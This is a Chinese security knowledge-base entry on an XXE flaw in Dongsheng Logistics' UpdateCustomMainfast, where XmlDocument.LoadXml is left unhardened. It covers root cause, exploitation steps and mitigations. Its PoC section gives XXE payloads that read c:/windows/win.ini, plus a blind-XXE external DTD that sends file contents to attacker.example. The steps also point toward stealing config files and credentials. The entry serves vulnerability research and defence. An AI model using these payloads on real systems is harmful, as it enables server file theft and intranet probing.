---
id: web-generic-xxe-dongsheng-logistics-custommainfast-loadxml
title: 东胜物流 UpdateCustomMainfast 未加固 XmlDocument.LoadXml 导致 XXE 文件读取
type: scenario
domain: web
path: web/generic/xxe
technique: dotnet-xmldocument-loadxml-xxe
tags:
- xxe
- dotnet
- xml
- xmldocument
- file-read
- code-audit
cve: []
severity: high
confidence: low
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V191
  verified_at: '2026-11-06T23:16:20+08:00'
  notes: 已对照原文与12张图核对：UpdateCustomMainfast中XmlDocument.LoadXml(Xdoc)、Save(FileToZip)、XmlSerializer.Deserialize、XdocAfter=='1'替换后LoadXml(XdocAfter)与截图一致；未设置XmlResolver=null/DTD限制成立；.NET Framework 4.5.2前后XmlResolver默认值差异说明正确；上层入口未给出、因此confidence low 合理；未实测回显/OOB
url: /docs/web/generic/xxe/web-generic-xxe-dongsheng-logistics-custommainfast-loadxml/
draft: false
kb_aliases:
- 东胜物流 XXE
- UpdateCustomMainfast XXE
- XmlDocument.LoadXml 外部实体
- XmlResolver 未置空
---

## 一句话结论

东胜物流的 `UpdateCustomMainfast` 方法把外部可控的 XML 字符串 `Xdoc`（以及 `XdocAfter`）直接交给 `XmlDocument.LoadXml`，且没有设置 `XmlResolver = null` 或禁用 DTD；在会解析外部实体的 .NET Framework 部署上，攻击者可用 `<!ENTITY ... SYSTEM "file:///...">` 读取服务器文件，或用 `http://` 实体探测/访问内网。

## 原理

- 方法体先 `XmlDocument xobj = new XmlDocument(); xobj.LoadXml(Xdoc); xobj.Save(FileToZip);`，随后 `new XmlSerializer(typeof(Manifest)).Deserialize(new StringReader(Xdoc))`；当 `XdocAfter` 非空时再次 `xobj.LoadXml(XdocAfter)` 并保存到 `Sendafter` 目录。`Xdoc`/`XdocAfter` 是方法参数，调用方传入前没有做 XML 安全校验。
- `XmlDocument.LoadXml(string)` 在解析带 `<!DOCTYPE ... [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>` 的文档时，是否解析外部实体由 `XmlDocument.XmlResolver` 与 DTD 处理策略决定；代码既没有把 `XmlResolver` 置为 `null`，也没有用 `XmlReaderSettings` 设置 `DtdProcessing = Prohibit`，因此沿用了运行时的默认值。
- 版本相关性：.NET Framework 4.5.2 之前，`XmlDocument.XmlResolver` 默认是 `XmlUrlResolver`，会解析 `SYSTEM` 实体；4.5.2 及以后默认值为 `null`，外部实体默认不解析。因此该问题在旧版 .NET Framework 目标、或代码/配置显式恢复 `XmlUrlResolver` 时才成立；目标框架版本未在代码中给出，需按部署确认。
- 读取时机：实体展开发生在 `LoadXml` 解析阶段，即使后续 `XmlSerializer.Deserialize` 因结构不匹配抛错，文件内容也已经进入 DOM；若方法把解析结果/异常回显给调用方，则为有回显文件读取；否则用参数实体 + 外部 DTD 做 OOB 外带。
- 同一份 XML 还会被 `XmlSerializer` 反序列化，若其中的阅读器同样未限制外部实体，可作为第二条解析路径；该点未单独验证。
- 解析后的 XML 被保存到 `d:\Manifest\Sendmain\<MblNo>.zip` 与 `Sendafter` 相关路径，说明服务端会把内容落盘；这本身不扩大 XXE 读取面，但可能让实体展开内容进入后续业务流程。

## 触发条件

- 能调用 `UpdateCustomMainfast` 并控制 `Xdoc`（以及可选的 `XdocAfter`、`MblNo` 等参数）；方法的上层入口/调用链未给出，需按实际业务确认可达性。
- 目标运行在默认解析外部实体的 .NET Framework 版本（4.5.2 之前，或显式设置 `XmlResolver` 为解析器），且未禁用 DTD。
- 进程对目标文件有读权限；OOB/SSRF 场景要求服务器可出网或能访问内网目标。
- 有回显依赖调用方把解析结果或异常信息返回；无回显时改用 OOB。

## 利用步骤

1. 找到调用 `UpdateCustomMainfast` 的上层接口/页面，确认 `Xdoc` 可由请求或上传的 XML 文件控制。
2. 先发带 `file:///c:/windows/win.ini`（Windows 目标）或 `file:///etc/passwd`（Linux 目标）的 well-formed XML，观察响应/异常中是否出现文件内容或实体解析错误。
3. 若目标结构要求匹配 `Manifest` 类型，保持 XML 结构与业务字段一致，只把实体引用放到某个文本节点；`LoadXml` 阶段就会展开实体，后续反序列化失败不影响读取。
4. 无回显时使用参数实体 + 外部 DTD：主文档引用攻击者服务器上的 DTD，DTD 内用 `%file;` 读取文件并拼到外带 URL；或用 `http://` 实体探测内网服务。
5. 读取应用配置文件、连接字符串、密钥文件；结合服务器权限评估是否可进一步读取数据库/云凭据。

## PoC

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE Manifest [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<Manifest>
  <Head>
    <MessageID>&xxe;</MessageID>
  </Head>
</Manifest>
```

```xml
<!-- 无回显时的盲 XXE：主文档引用外部 DTD -->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE Manifest [
  <!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd">
  %dtd;
]>
<Manifest><Head><MessageID>test</MessageID></Head></Manifest>
```

```text
# attacker.example/evil.dtd
<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.example/?d=%file;'>">
%all;
```

## 变体与关联

- .NET 同类 sink：`XmlDocument.Load`/`LoadXml`、`XmlReader`（`DtdProcessing.Parse`）、`XmlTextReader`、`DataSet.ReadXml`、`XmlSerializer` 配合不安全 reader；审计时搜 `LoadXml(`、`XmlResolver`、`DtdProcessing`。
- 与 [[web-generic-xxe-inband-file-read-default-insecure]] 同类（解析器默认允许外部实体导致有回显文件读取），本例为 .NET `XmlDocument` 版本默认值相关。
- 与 [[oob-exfil]] 关联：无回显时使用参数实体 OOB 外带。
- 版本差异是重要变体：同一代码在 .NET Framework 4.5.2+ 默认 `XmlResolver=null` 时可能不触发，不能仅凭 sink 判定可利用，需确认框架版本/配置。

## 检测与防御

- 解析前显式 `xobj.XmlResolver = null;`；更稳妥地使用 `XmlReader.Create(..., new XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit, XmlResolver = null })` 再 `Load`。
- 拒绝包含 `DOCTYPE`/`ENTITY` 的输入；对 XML 做结构/白名单校验；禁用外部 DTD 与外部实体。
- 运行在 .NET Framework 4.5.2+ 并确认 `XmlDocument.XmlResolver` 默认 null；不要为了兼容业务显式设置 `XmlUrlResolver`。
- 限制应用池账户文件读权限与出网权限；对 `file://`、`http://` 实体解析失败做告警。
- 检测：请求体/上传 XML 中出现 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://`、`http://`；进程异常读取系统文件或访问内网地址。
